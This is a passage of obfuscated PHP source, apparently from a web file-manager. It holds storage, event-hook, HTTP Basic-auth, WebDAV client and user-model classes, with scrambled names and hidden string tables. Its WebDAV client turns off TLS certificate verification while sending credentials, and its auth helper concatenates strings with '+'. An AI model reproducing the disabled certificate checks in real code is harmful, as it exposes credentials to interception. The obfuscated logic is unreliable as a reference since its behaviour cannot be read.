C­ÌøƒÏ; a™Ã´ïğÇ¾: } public function fileOutServer($cÖ´êÀƒøï, $bğß²ªŠç = false, $Dèñ›ÎÎŒ = false, $BŒ„ğ³òª = '') { parent::fileOut($cÖ´êÀƒøï, $bğß²ªŠç, $Dèñ›ÎÎŒ, $BŒ„ğ³òª); } public function fileOutImage($DÔí‰“…ì±, $déÙó¡è„ = 250) { $E£±è­ÔÔ– = array(OSS\OssClient::OSS_PROCESS => $_SERVER[‡’¶øåüç˜][1217] . $déÙó¡è„); $eĞ‹»—¿–„ = $this->link($DÔí‰“…ì±, $E£±è­ÔÔ–); $this->fileOutLink($eĞ‹»—¿–„); } public function fileOutImageServer($dÚ«¡Àğ·Á, $dâÜ”•öÇ = 250) { parent::fileOutImage($dÚ«¡Àğ·Á, $dâÜ”•öÇ); } public function fileOutLink($Fˆ™ƒİœ•è) { $b“²¸ì·¿ë =& $_SERVER[‡’¶øåüç˜]; if (!$this->isCdnHost() && substr($Fˆ™ƒİœ•è, 0, 7) == $b“²¸ì·¿ë[1122]) { $Fˆ™ƒİœ•è = $b“²¸ì·¿ë[1123] . substr($Fˆ™ƒİœ•è, 7); } header($b“²¸ì·¿ë[156] . $Fˆ™ƒİœ•è); die; } public function hashMd5($B­ÍĞ‰ŠŒ, $fÕê¦Øæ”† = '') { $DÏ‘¡¤Ö¸¼ =& $_SERVER[‡’¶øåüç˜]; $DÆŒ½†É·‘ = $this->objectMeta($B­ÍĞ‰ŠŒ); if (!$DÆŒ½†É·‘) { return $DÏ‘¡¤Ö¸¼[33]; } if (!isset($DÆŒ½†É·‘[$DÏ‘¡¤Ö¸¼[1191]]) && !empty($fÕê¦Øæ”†)) { $eØ¡‰¯ëäÑ = $this->updateObjMeta($B­ÍĞ‰ŠŒ, array($DÏ‘¡¤Ö¸¼[1191] => $fÕê¦Øæ”†)); $DÆŒ½†É·‘[$DÏ‘¡¤Ö¸¼[1191]] = $eØ¡‰¯ëäÑ ? $fÕê¦Øæ”† : $DÏ‘¡¤Ö¸¼[33]; } return isset($DÆŒ½†É·‘[$DÏ‘¡¤Ö¸¼[1191]]) ? strtolower($DÆŒ½†É·‘[$DÏ‘¡¤Ö¸¼[1191]]) : $DÏ‘¡¤Ö¸¼[33]; } public function size($f‹˜±êé“÷) { $e• èºàåÀ = $this->objectMeta($f‹˜±êé“÷); return $e• èºàåÀ ? $e• èºàåÀ[$_SERVER[‡’¶øåüç˜][77]] : 0; } public function info($Aò¯² îºØ) { if ($this->isFolder($Aò¯² îºØ)) { return $this->folderInfo($Aò¯² îºØ); } else { if ($this->isFile($Aò¯² îºØ)) { return $this->fileInfo($Aò¯² îºØ); } } return !1; } public function exist($Fñé­„¬¶) { return $this->isFile($Fñé­„¬¶) || $this->isFolder($Fñé­„¬¶); } public function isFile($aÌ÷åáÓÑá) { return !$this->isFolder($aÌ÷åáÓÑá) && $this->objectMeta($aÌ÷åáÓÑá); } public function isFolder($CÚöŒŠ–Ñ£) { return $this->cacheMethod($_SERVER[‡’¶øåüç˜][227], $CÚöŒŠ–Ñ£); } protected function objectMeta($BÀñÌ”ùˆ‘) { return $this->cacheMethod($_SERVER[‡’¶øåüç˜][228], $BÀñÌ”ùˆ‘); } protected function _objectMeta($dÙ’¯›‚ö) { $dŒ÷¢¸º =& $_SERVER[‡’¶øåüç˜]; try { $C‘Ø‡ù Æ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($dÙ’¯›‚ö)); } catch (OSS\Core\OssException $c‰ßêè§) { $C‘Ø‡ù Æ = !1; } if ($C‘Ø‡ù Æ) { $C‘Ø‡ù Æ[$dŒ÷¢¸º[77]] = intval($C‘Ø‡ù Æ[$dŒ÷¢¸º[1198]]); } return $C‘Ø‡ù Æ; } protected function _isFolder($EÃ’ÇÉ÷óñ) { $fğ¤Ç§èñ¶ =& $_SERVER[‡’¶øåüç˜]; if ($EÃ’ÇÉ÷óñ == $fğ¤Ç§èñ¶[33] || $EÃ’ÇÉ÷óñ == $fğ¤Ç§èñ¶[8]) { return !0; } $FËæ‰èÁë = array($fğ¤Ç§èñ¶[1188] => $fğ¤Ç§èñ¶[8], $fğ¤Ç§èñ¶[190] => rtrim($EÃ’ÇÉ÷óñ, $fğ¤Ç§èñ¶[8]) . $fğ¤Ç§èñ¶[8], $fğ¤Ç§èñ¶[1189] => 1, $fğ¤Ç§èñ¶[1190] => $fğ¤Ç§èñ¶[33]); $a„—Íï“¨« = $this->client->listObjects($this->bucket, $FËæ‰èÁë); if ($a„—Íï“¨«->getObjectList() || $a„—Íï“¨«->getPrefixList()) { return !0; } return !1; } } goto CõÒÈ¢Îñ; Fƒİ²ò×î: class Hook { private static $events = array(); public static function get($A³Àø˜ƒäô = false) { if (!$A³Àø˜ƒäô) { return self::$events; } else { return self::$events[$A³Àø˜ƒäô]; } } public static function apply($Eß±ŞŒ î, $eÉ­ Ãõ = array()) { $D®¸±×İ»õ = ActionApply($Eß±ŞŒ î, $eÉ­ Ãõ); if (is_string($Eß±ŞŒ î)) { Hook::trigger($Eß±ŞŒ î); } return $D®¸±×İ»õ; } public static function bind($fÁìÒŒááà, $Bøšœ Óƒ, $d‘Í­øœ¿é = false) { $d»Åä¢Š¨È =& $_SERVER[‡’¶øåüç˜]; if (!isset(self::$events[$fÁìÒŒááà])) { self::$events[$fÁìÒŒááà] = array(); } self::$events[$fÁìÒŒááà][] = array($d»Åä¢Š¨È[1756] => $Bøšœ Óƒ, $d»Åä¢Š¨È[1757] => $d‘Í­øœ¿é, $d»Åä¢Š¨È[1758] => 0); } public static function once($d³±ò½Õ, $fäêİ•ƒï¹) { self::bind($d³±ò½Õ, $fäêİ•ƒï¹, !0); } public static function unbind($D¼ÊÓ‡«—, $aµì¢…“¤› = false) { if (!$aµì¢…“¤›) { self::$events[$D¼ÊÓ‡«—] = array(); return; } $Eµ´‹ˆÙì = self::$events[$D¼ÊÓ‡«—]; self::$events[$D¼ÊÓ‡«—] = array(); if (!is_array($Eµ´‹ˆÙì)) { return; } for ($dÕ†„âç– = 0; $dÕ†„âç– < count($Eµ´‹ˆÙì); $dÕ†„âç–++) { if ($Eµ´‹ˆÙì[$dÕ†„âç–][$_SERVER[‡’¶øåüç˜][1756]] == $aµì¢…“¤›) { continue; } self::$events[$D¼ÊÓ‡«—][] = $Eµ´‹ˆÙì[$dÕ†„âç–]; } } public static function filter($D“ïõ¼ø‚, $EÓØíÉõÉ) { goto E‹ê×ˆËá“; f¸†‹¯±Á: $BÊÛÆ‘‰ÀÄ = $c²šƒéí[$D“ïõ¼ø‚]; $f˜×ôÆÅ¹’ = $EÓØíÉõÉ; if (!is_array($BÊÛÆ‘‰ÀÄ) || count($BÊÛÆ‘‰ÀÄ) == 0) { return $f˜×ôÆÅ¹’; } goto F³Ù‡á‹©º; E‹ê×ˆËá“: $eÅôÒ‡¯Óª =& $_SERVER[‡’¶øåüç˜]; $c²šƒéí = self::$events; if (!isset($c²šƒéí[$D“ïõ¼ø‚])) { return $EÓØíÉõÉ; } goto f¸†‹¯±Á; F³Ù‡á‹©º: for ($FÈ£Äµ¢¶½ = 0; $FÈ£Äµ¢¶½ < count($BÊÛÆ‘‰ÀÄ); $FÈ£Äµ¢¶½++) { $dôÂä§˜Š = $BÊÛÆ‘‰ÀÄ[$FÈ£Äµ¢¶½]; if ($dôÂä§˜Š[$eÅôÒ‡¯Óª[1757]] && $dôÂä§˜Š[$eÅôÒ‡¯Óª[1758]] > 1) { continue; } self::$events[$D“ïõ¼ø‚][$FÈ£Äµ¢¶½][$eÅôÒ‡¯Óª[1758]] = $dôÂä§˜Š[$eÅôÒ‡¯Óª[1758]] + 1; $c…‹›Õï‹Ô = self::apply($dôÂä§˜Š[$eÅôÒ‡¯Óª[1756]], array($f˜×ôÆÅ¹’)); if (gettype($c…‹›Õï‹Ô) == gettype($f˜×ôÆÅ¹’)) { $f˜×ôÆÅ¹’ = $c…‹›Õï‹Ô; } } return $f˜×ôÆÅ¹’; goto Cå¦×Î‹„„; Cå¦×Î‹„„: } public static function trigger($b£–ÃŠ) { goto a›Å³¶àÈÓ; C¯§ÏÒ»ÎÅ: $B‰­Ôğ”‹‚ = func_get_args(); array_shift($B‰­Ôğ”‹‚); for ($d–Éá£Éø = 0; $d–Éá£Éø < count($D‘ƒÎó¾Œó); $d–Éá£Éø++) { $f„ˆîƒ¦Ë¹ = $D‘ƒÎó¾Œó[$d–Éá£Éø]; if ($f„ˆîƒ¦Ë¹[$B¶Äôî Ôˆ[1757]] && $f„ˆîƒ¦Ë¹[$B¶Äôî Ôˆ[1758]] > 1) { continue; } if (defined($B¶Äôî Ôˆ[1759]) && GLOBAL_LOG_HOOK) { write_log($b£–ÃŠ . $B¶Äôî Ôˆ[1760] . $f„ˆîƒ¦Ë¹[$B¶Äôî Ôˆ[1756]], $B¶Äôî Ôˆ[1761]); } self::$events[$b£–ÃŠ][$d–Éá£Éø][$B¶Äôî Ôˆ[1758]] = $f„ˆîƒ¦Ë¹[$B¶Äôî Ôˆ[1758]] + 1; $FòÍ•’‚­Ò = self::apply($f„ˆîƒ¦Ë¹[$B¶Äôî Ôˆ[1756]], $B‰­Ôğ”‹‚); if (defined($B¶Äôî Ôˆ[1759]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $B¶Äôî Ôˆ[1761]); if ($f„ˆîƒ¦Ë¹[$B¶Äôî Ôˆ[1758]] == 200) { $D©ŠÁ†—œ = is_array($f„ˆîƒ¦Ë¹[$B¶Äôî Ôˆ[1756]]) ? json_encode_force($f„ˆîƒ¦Ë¹[$B¶Äôî Ôˆ[1756]]) : $f„ˆîƒ¦Ë¹[$B¶Äôî Ôˆ[1756]]; write_log($B¶Äôî Ôˆ[1762] . $b£–ÃŠ . $B¶Äôî Ôˆ[1763] . $D©ŠÁ†—œ, $B¶Äôî Ôˆ[1764]); } } $a“ŞĞë‰İ‹ = is_null($FòÍ•’‚­Ò) ? $a“ŞĞë‰İ‹ : $FòÍ•’‚­Ò; } goto f÷„™Ä—„; f÷„™Ä—„: return $a“ŞĞë‰İ‹; goto c™ì›·‚§·; a›Å³¶àÈÓ: $B¶Äôî Ôˆ =& $_SERVER[‡’¶øåüç˜]; $a‚ä„â¼÷¥ = self::$events; $a“ŞĞë‰İ‹ = !1; goto F™Ï…ª¢«Í; F™Ï…ª¢«Í: if (!isset($a‚ä„â¼÷¥[$b£–ÃŠ])) { return $a“ŞĞë‰İ‹; } $D‘ƒÎó¾Œó = $a‚ä„â¼÷¥[$b£–ÃŠ]; if (!is_array($D‘ƒÎó¾Œó) || count($D‘ƒÎó¾Œó) == 0) { return $a“ŞĞë‰İ‹; } goto C¯§ÏÒ»ÎÅ; c™ì›·‚§·: } } class HttpAuth { public static function get() { $eÇĞõ´ =& $_SERVER[‡’¶øåüç˜]; $Cƒä‡ç—Üâ = $eÇĞõ´[33]; $aÒ¨Áç©Œ = $eÇĞõ´[33]; if (isset($_SERVER[$eÇĞõ´[1765]])) { $Cƒä‡ç—Üâ = $_SERVER[$eÇĞõ´[1765]]; $aÒ¨Áç©Œ = $_SERVER[$eÇĞõ´[1766]]; } elseif (isset($_SERVER[$eÇĞõ´[1767]])) { $D«ïÑ¶éŠÕ = $_SERVER[$eÇĞõ´[1767]]; if (strpos(strtolower($D«ïÑ¶éŠÕ), $eÇĞõ´[1768]) === 0) { $AËˆË‡˜Û = explode($eÇĞõ´[4], base64_decode(substr($D«ïÑ¶éŠÕ, 6))); $Cƒä‡ç—Üâ = isset($AËˆË‡˜Û[0]) ? $AËˆË‡˜Û[0] : $eÇĞõ´[33]; $aÒ¨Áç©Œ = isset($AËˆË‡˜Û[1]) ? $AËˆË‡˜Û[1] : 0; } } return array($eÇĞõ´[547] => $Cƒä‡ç—Üâ, $eÇĞõ´[900] => $aÒ¨Áç©Œ); } public static function error() { goto Fô…×óë“Ò; Fô…×óë“Ò: $B†ß­ğ’î =& $_SERVER[‡’¶øåüç˜]; header($B†ß­ğ’î[1769]); header($B†ß­ğ’î[1770]); goto dÆÚ¹Ä¸âÄ; dÆÚ¹Ä¸âÄ: header($B†ß­ğ’î[1771]); header($B†ß­ğ’î[1772]); header($B†ß­ğ’î[1269]); goto BÚ˜ç‚Èİé; BÚ˜ç‚Èİé: die; goto BÖè‰‡éé; BÖè‰‡éé: } public static function make($EŞÄõø¹¶, $Cô¼‰Š¤Ø) { $A”½ÜŞ—Ôë =& $_SERVER[‡’¶øåüç˜]; return $A”½ÜŞ—Ôë[1773] + base64_encode($EŞÄõø¹¶ . $A”½ÜŞ—Ôë[4] . $Cô¼‰Š¤Ø); } } class HttpDavClient { public function __construct($e¦ğ‚ƒæ›Î, $bßÁ¥é×•, $aƒİªİçš©) { $this->header = array(); $this->userName = $bßÁ¥é×•; $this->userPassowrd = $aƒİªİçš©; } protected function makePath($B®ƒ¹•¸µ´) { return $B®ƒ¹•¸µ´; } protected function setHeader($aà©°²”×, $Bõç±Â´ëØ = false) { if ($Bõç±Â´ëØ === !1) { $this->header[] = $aà©°²”×; } else { $this->header[] = $aà©°²”× . $_SERVER[‡’¶øåüç˜][883] . $Bõç±Â´ëØ; } } public function move($fÌ²ÑëËÇÎ, $EÀÆè±èÑ†, $a¼ñ¶¡İ¾ = '') { $f¢´Áõ¡ö =& $_SERVER[‡’¶øåüç˜]; $this->setHeader($f¢´Áõ¡ö[1774], $this->makePath($EÀÆè±èÑ†)); $this->setHeader($f¢´Áõ¡ö[1775], $f¢´Áõ¡ö[1776]); if ($a¼ñ¶¡İ¾) { $this->setHeader($f¢´Áõ¡ö[1777], $f¢´Áõ¡ö[928] . $a¼ñ¶¡İ¾ . $f¢´Áõ¡ö[931]); } return $this->send($f¢´Áõ¡ö[1778], $fÌ²ÑëËÇÎ); } public function copy($C›“¼Ç‚çî, $EÎ‚Û‰ŒÅÓ) { $fêÌ‹º’ =& $_SERVER[‡’¶øåüç˜]; $this->setHeader($fêÌ‹º’[1774], $this->makePath($EÎ‚Û‰ŒÅÓ)); $this->setHeader($fêÌ‹º’[1775], $fêÌ‹º’[1776]); return $this->send($fêÌ‹º’[1779], $C›“¼Ç‚çî); } public function mkcol($EŞìß¨ÖÅÚ) { $dÃ…›ï‡Ì =& $_SERVER[‡’¶øåüç˜]; $this->setHeader($dÃ…›ï‡Ì[1775], $dÃ…›ï‡Ì[1776]); return $this->send($dÃ…›ï‡Ì[1780], $EŞìß¨ÖÅÚ); } public function delete($cÃ”í³Æ¡­, $b÷¡Ğ„ğº = '') { $C‹ïŒÑ”¾ =& $_SERVER[‡’¶øåüç˜]; if ($b÷¡Ğ„ğº) { $this->setHeader($C‹ïŒÑ”¾[1777], $C‹ïŒÑ”¾[928] . $b÷¡Ğ„ğº . $C‹ïŒÑ”¾[931]); } return $this->send($C‹ïŒÑ”¾[1257], $cÃ”í³Æ¡­); } public function propfind($e‘Åİ¯Ø­) { $aÂô–è¢Èµ =& $_SERVER[‡’¶øåüç˜]; $this->setHeader($aÂô–è¢Èµ[1781], $aÂô–è¢Èµ[83]); $this->setHeader($aÂô–è¢Èµ[1782], $aÂô–è¢Èµ[1783]); $B‡‚¥ò²ï’ = $aÂô–è¢Èµ[1784]; return $this->send($aÂô–è¢Èµ[1785], $e‘Åİ¯Ø­, $B‡‚¥ò²ï’); } public function options($DÜ Ò¬»ËÔ) { return $this->send($_SERVER[‡’¶øåüç˜][1786], $DÜ Ò¬»ËÔ); } public function get($a°Œµ§«ÌĞ) { return $this->send($_SERVER[‡’¶øåüç˜][220], $a°Œµ§«ÌĞ); } public function put($eÕóåäŒªº, $b†±®¨™Êã, $c“ĞÍÍîëÊ = '') { $då™ÚÅœù =& $_SERVER[‡’¶øåüç˜]; if ($c“ĞÍÍîëÊ) { $this->setHeader($då™ÚÅœù[1777], $då™ÚÅœù[928] . $c“ĞÍÍîëÊ . $då™ÚÅœù[931]); } return $this->send($då™ÚÅœù[218], $eÕóåäŒªº, $b†±®¨™Êã); } protected function send($Dæ´‡êº, $aØ“‘‰¦®À, $céõÊ¯—ÍŒ = false, $Dß¥¨¥‰…¹ = false) { goto a²ªá°‡Áğ; aˆßÒÒ¾: curl_setopt($dÙÅÕÇºĞ«, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($dÙÅÕÇºĞ«, CURLOPT_SSL_VERIFYHOST, !1); $Aäî¶¦Ó±Î = curl_exec($dÙÅÕÇºĞ«); goto DÂº®Ö³ÏĞ; a²ªá°‡Áğ: $AòØ‹Ãé¾Ñ =& $_SERVER[‡’¶øåüç˜]; $F´¬‹®®× = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($AòØ‹Ãé¾Ñ[1787], $AòØ‹Ãé¾Ñ[50]); goto cµÚ¶‰§õ¢; cºÀ«»£¬–: curl_setopt($dÙÅÕÇºĞ«, CURLOPT_HTTPHEADER, $this->header); curl_setopt($dÙÅÕÇºĞ«, CURLOPT_RETURNTRANSFER, !0); curl_setopt($dÙÅÕÇºĞ«, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto aˆßÒÒ¾; Eª±à°¿Ë¾: $dÙÅÕÇºĞ« = curl_init($aØ“‘‰¦®À); curl_setopt($dÙÅÕÇºĞ«, CURLOPT_CUSTOMREQUEST, $Dæ´‡êº); curl_setopt($dÙÅÕÇºĞ«, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto cºÀ«»£¬–; cµÚ¶‰§õ¢: $this->setHeader($F´¬‹®®×); if ($céõÊ¯—ÍŒ) { $céõÊ¯—ÍŒ = $AòØ‹Ãé¾Ñ[1788] . $céõÊ¯—ÍŒ; } if (!request_url_safe($aØ“‘‰¦®À)) { return !1; } goto Eª±à°¿Ë¾; DÂº®Ö³ÏĞ: $this->header = array(); return $Aäî¶¦Ó±Î; goto D¬‹áŸ¹¯ƒ; D¬‹áŸ¹¯ƒ: } } goto b³ëÛãé²Ş; fœÎÕÆµ¿‘: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x6a\157\x62\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\144\145\163\143", "\x73\x6f\162\164"); const JOB_KEY = "\163\x65\154\x66\x4a\x6f\142\114\151\163\x74"; public function listData($cîØèœ«Áì = false, $a¸Ññâ‘© = "\163\157\162\164", $B¿ï¥ªÏ‰ñ = false) { return parent::listData($cîØèœ«Áì, $a¸Ññâ‘©, $B¿ï¥ªÏ‰ñ); } public function remove($Eî’õÉåÜÃ) { return parent::remove($Eî’õÉåÜÃ); } public function add($bÆÂ÷™æ´á) { $B¸¥å—®¯“ =& $_SERVER[‡’¶øåüç˜]; if ($this->findByName($bÆÂ÷™æ´á[$B¸¥å—®¯“[28]])) { return !1; } $bÆÂ÷™æ´á[$B¸¥å—®¯“[2134]] = $this->getSort(); return parent::insert($bÆÂ÷™æ´á); } private function getSort() { $B•×Ÿğ˜‡© =& $_SERVER[‡’¶øåüç˜]; $FæòáÌÃÖ = parent::listData(); $C†™‰Œò = array_to_keyvalue($FæòáÌÃÖ, $B•×Ÿğ˜‡©[33], $B•×Ÿğ˜‡©[2134]); return empty($C†™‰Œò) ? 0 : max($C†™‰Œò) + 1; } public function update($B‡Ò•Û°ˆœ, $cùñ¨Í¯‘¹) { $eÁöÎ‰‘ù– =& $_SERVER[‡’¶øåüç˜]; $B¾­‹ø½¸ó = parent::listData($B‡Ò•Û°ˆœ); $C©•™Ğ¼õ = $this->findByName($cùñ¨Í¯‘¹[$eÁöÎ‰‘ù–[28]]); if (!$B¾­‹ø½¸ó || $C©•™Ğ¼õ && $C©•™Ğ¼õ[$eÁöÎ‰‘ù–[371]] != $B¾­‹ø½¸ó[$eÁöÎ‰‘ù–[371]]) { return !1; } return parent::update($B‡Ò•Û°ˆœ, $cùñ¨Í¯‘¹); } public function setUserJob($DÆ¤Œ‚„Ø•, $eÑÜÛ§‘æî) { goto AÁ¨„Í‹ªÇ; AÁ¨„Í‹ªÇ: $bÄÇˆ™“ìø =& $_SERVER[‡’¶øåüç˜]; if (!is_array($eÑÜÛ§‘æî)) { $eÑÜÛ§‘æî = array($eÑÜÛ§‘æî); } $A‹æ¾æáâ = parent::listData(); goto CÔšˆæ²¶’; CÔšˆæ²¶’: $eãá–´ô‡ = array_to_keyvalue($A‹æ¾æáâ, $bÄÇˆ™“ìø[28]); $f¿¦çæá‘ = $bÄÇˆ™“ìø[365]; foreach ($eÑÜÛ§‘æî as $F‰ìùìÌ) { if ($eãá–´ô‡[$F‰ìùìÌ]) { $f¿¦çæá‘ .= $eãá–´ô‡[$F‰ìùìÌ][$bÄÇˆ™“ìø[371]] . $bÄÇˆ™“ìø[47]; } else { $aÊªµƒ”­ = $this->add($F‰ìùìÌ); $f¿¦çæá‘ .= $aÊªµƒ”­ . $bÄÇˆ™“ìø[47]; } } goto Câó°íÆÍº; Câó°íÆÍº: $f¿¦çæá‘ = rtrim($f¿¦çæá‘, $bÄÇˆ™“ìø[47]); Model($bÄÇˆ™“ìø[490])->metaSet($DÆ¤Œ‚„Ø•, self::JOB_KEY, $f¿¦çæá‘); goto D‰È©ºÌôÙ; D‰È©ºÌôÙ: } public function getUserJob($EÈèŞÛ¦‚’) { $c„ŞìÏÍà¨ = Model($_SERVER[‡’¶øåüç˜][490])->metaGet($EÈèŞÛ¦‚’); return $this->getUserJobInfo($c„ŞìÏÍà¨[self::JOB_KEY]); } public function getUserJobInfo($bÔ‚Å›Š¸Ğ) { goto dºÜŞ‰¨; dºÜŞ‰¨: $F„Ö¢”Îç =& $_SERVER[‡’¶øåüç˜]; $A¶¥ÜÇÊÏÎ = explode($F„Ö¢”Îç[47], $bÔ‚Å›Š¸Ğ); $CĞÒ–óİ¾× = parent::listData(); goto aÌ‹˜¼½¼; aÌ‹˜¼½¼: $CĞÒ–óİ¾× = array_remove_key($CĞÒ–óİ¾×, $F„Ö¢”Îç[191]); $aƒ¸£·•Ÿœ = array(); foreach ($A¶¥ÜÇÊÏÎ as $Cğ±ùÔ‹ŸŞ) { if (isset($CĞÒ–óİ¾×[$Cğ±ùÔ‹ŸŞ])) { $aƒ¸£·•Ÿœ[] = $CĞÒ–óİ¾×[$Cğ±ùÔ‹ŸŞ]; } } goto BÄˆÄö„†à; BÄˆÄö„†à: return $aƒ¸£·•Ÿœ; goto fíñ•·¼Ù¿; fíñ•·¼Ù¿: } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\164\141\x62\154\x65\116\141\x6d\145" => "\165\163\145\x72\x5f\x6d\x65\x74\141", "\x6d\145\x74\141\106\151\145\x6c\144" => "\x75\163\145\162\111\x44"); protected $simpleField = "\x75\x73\145\x72\x49\104\x2c\x6e\151\x63\153\x4e\141\x6d\145\x2c\156\x61\x6d\x65\54\x61\166\x61\x74\141\162\x2c\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($dëÙÌ–—¤î) { $e¹Å„Ú²øâ =& $_SERVER[‡’¶øåüç˜]; $d†Ñò‹ƒÜ¡ = $e¹Å„Ú²øâ[2524]; return array($e¹Å„Ú²øâ[2181] => array($dëÙÌ–—¤î[0], $d†Ñò‹ƒÜ¡), $e¹Å„Ú²øâ[2183] => array($dëÙÌ–—¤î[0], $d†Ñò‹ƒÜ¡), $e¹Å„Ú²øâ[2525] => array($dëÙÌ–—¤î[0], $d†Ñò‹ƒÜ¡)); } protected function getInfo($b¤›³Ë·Š¶, $f¡Èùàæ• = false) { $f˜ö…»‡„ = $this->getInfoSimple($b¤›³Ë·Š¶); if (!is_array($f˜ö…»‡„)) { return array(); } if ($f¡Èùàæ•) { return $this->_getInfoApply($f˜ö…»‡„); } return $this->cacheFunctionGet($_SERVER[‡’¶øåüç˜][2237], $b¤›³Ë·Š¶); } protected function getInfoFull($E‚“ª¾ÏÒì, $fñ½‰±Ê’î = false) { $eÌ—â‹ÊŞÛ = $this->getInfoSimple($E‚“ª¾ÏÒì); if (!is_array($eÌ—â‹ÊŞÛ)) { return array(); } if ($fñ½‰±Ê’î) { return $this->_getInfoApply($eÌ—â‹ÊŞÛ, !0); return $this->_getInfoApply($eÌ—â‹ÊŞÛ, !0); } return $this->cacheFunctionGet($_SERVER[‡’¶øåüç˜][2526], $E‚“ª¾ÏÒì); } private function _getInfoApply($BĞ›‘ÄŞ¶Ì, $eÃ“ÓéÄ = false) { goto EİÜÁ¼Á¦ç; EİÜÁ¼Á¦ç: $F—´ËÀÉ³ =& $_SERVER[‡’¶øåüç˜]; if (!$BĞ›‘ÄŞ¶Ì) { return $BĞ›‘ÄŞ¶Ì; } $a„ŠÊ±Ÿ®À = md5($F—´ËÀÉ³[2527] . $BĞ›‘ÄŞ¶Ì[$F—´ËÀÉ³[807]] . $F—´ËÀÉ³[2528] . $BĞ›‘ÄŞ¶Ì[$F—´ËÀÉ³[28]]); goto CµÕˆÆßÚš; CµÕˆÆßÚš: $BĞ›‘ÄŞ¶Ì = $this->_listDataApplyItem($BĞ›‘ÄŞ¶Ì); $C°²Åæ£³Ì = Model($F—´ËÀÉ³[1124])->metaGet($BĞ›‘ÄŞ¶Ì[$F—´ËÀÉ³[403]][$F—´ËÀÉ³[381]]); $BĞ›‘ÄŞ¶Ì[$F—´ËÀÉ³[2529]] = $a„ŠÊ±Ÿ®À; goto b¯›Œ¸Éí; b¯›Œ¸Éí: $BĞ›‘ÄŞ¶Ì[$F—´ËÀÉ³[403]][$F—´ËÀÉ³[2366]] = isset($C°²Åæ£³Ì[$F—´ËÀÉ³[2367]]) ? $C°²Åæ£³Ì[$F—´ËÀÉ³[2367]] : null; if ($eÃ“ÓéÄ) { $BĞ›‘ÄŞ¶Ì[$F—´ËÀÉ³[429]] = $this->metaGet($BĞ›‘ÄŞ¶Ì[$F—´ËÀÉ³[1443]]); } return $BĞ›‘ÄŞ¶Ì; goto f­¿šç«…; f­¿šç«…: } protected function getInfoSimple($Cïá‹ïÇ‰‘, $cŞÂ²âŒâº = false) { $C¸‡‰¥¹¬ =& $_SERVER[‡’¶øåüç˜]; if (!$Cïá‹ïÇ‰‘) { return array(); } if ($cŞÂ²âŒâº) { $e¢²å¢„ñ® = $this->where(array($C¸‡‰¥¹¬[1443] => intval($Cïá‹ïÇ‰‘)))->find(); if (!is_array($e¢²å¢„ñ®)) { return array(); } $e¢²å¢„ñ®[$C¸‡‰¥¹¬[2530]] = Action($C¸‡‰¥¹¬[2531])->parseUrl($e¢²å¢„ñ®[$C¸‡‰¥¹¬[2530]]); return $e¢²å¢„ñ®; } return $this->cacheFunctionGet($C¸‡‰¥¹¬[2184], $Cïá‹ïÇ‰‘); } protected function getInfoSimpleOuter($eÄ°„ÃÍ«) { goto E²Œ•ïáòÖ; fôÄª¿˜è™: return $Fˆ ÁâÒ’ª; goto aÇ¥Ÿ¶ñ¹; FÍ‡¾¿º±: $Fˆ ÁâÒ’ª = array_field_key($D„Øğ‡‡•, explode($A½¦À«â¡Ó[47], $this->simpleField)); if (!$Fˆ ÁâÒ’ª) { return array($A½¦À«â¡Ó[1443] => $A½¦À«â¡Ó[1039], $A½¦À«â¡Ó[28] => $A½¦À«â¡Ó[157] . LNG($A½¦À«â¡Ó[2534]) . $A½¦À«â¡Ó[489], $A½¦À«â¡Ó[2530] => STATIC_PATH . $A½¦À«â¡Ó[2535]); } $Fˆ ÁâÒ’ª[$A½¦À«â¡Ó[2530]] = Action($A½¦À«â¡Ó[2531])->parseUrl($Fˆ ÁâÒ’ª[$A½¦À«â¡Ó[2530]]); goto fôÄª¿˜è™; E²Œ•ïáòÖ: $A½¦À«â¡Ó =& $_SERVER[‡’¶øåüç˜]; if (!$eÄ°„ÃÍ« || $eÄ°„ÃÍ« == 0) { return array($A½¦À«â¡Ó[1443] => $A½¦À«â¡Ó[481], $A½¦À«â¡Ó[28] => $A½¦À«â¡Ó[157] . LNG($A½¦À«â¡Ó[2532]) . $A½¦À«â¡Ó[489], $A½¦À«â¡Ó[2530] => STATIC_PATH . $A½¦À«â¡Ó[2533]); } $D„Øğ‡‡• = $this->cacheFunctionGet($A½¦À«â¡Ó[2184], $eÄ°„ÃÍ«); goto FÍ‡¾¿º±; aÇ¥Ÿ¶ñ¹: } protected function groupUser($fÕì¸¼ÚŸÃ) { } public static function errorLang($bÀéŸ²È†¶) { $BÚÎ‚ğØÀ‡ =& $_SERVER[‡’¶øåüç˜]; $aÖÀ¿Ò›¢È = array(self::ERROR_USER_NOT_EXISTS => $BÚÎ‚ğØÀ‡[2536], self::ERROR_USER_PASSWORD_ERROR => $BÚÎ‚ğØÀ‡[2537], self::ERROR_USER_EXIST_NAME => $BÚÎ‚ğØÀ‡[2538], self::ERROR_USER_EXIST_PHONE => $BÚÎ‚ğØÀ‡[2539], self::ERROR_USER_EXIST_EMAIL => $BÚÎ‚ğØÀ‡[2540], self::ERROR_USER_LOGIN_LOCK => $BÚÎ‚ğØÀ‡[2541], self::ERROR_IP_NOT_ALLOW => $BÚÎ‚ğØÀ‡[2542], self::ERROR_USER_EXIST_NICKNAME => $BÚÎ‚ğØÀ‡[2543]); return LNG($aÖÀ¿Ò›¢È[$bÀéŸ²È†¶]); } public function getInfoByMeta($DÈî…ñ¤Ã, $b”ç°˜âİß) { $d¶ÑÚù¬İ‡ =& $_SERVER[‡’¶øåüç˜]; $càß°Ã”È = Model($d¶ÑÚù¬İ‡[2544])->where(array($d¶ÑÚù¬İ‡[89] => 